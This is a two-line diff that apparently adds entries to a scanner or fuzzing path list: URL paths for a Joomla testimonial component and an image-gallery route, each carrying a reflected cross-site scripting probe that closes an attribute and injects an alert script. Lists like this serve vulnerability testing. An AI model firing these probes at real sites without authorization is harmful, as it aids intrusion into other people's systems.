@@ -1,0 +1,2 @@
+/components/com_cgtestimonial/video.php?url="><script>alert('xss');</script>
+/index.php/image-gallery/"><script>alert('xss');</script>/25-koala
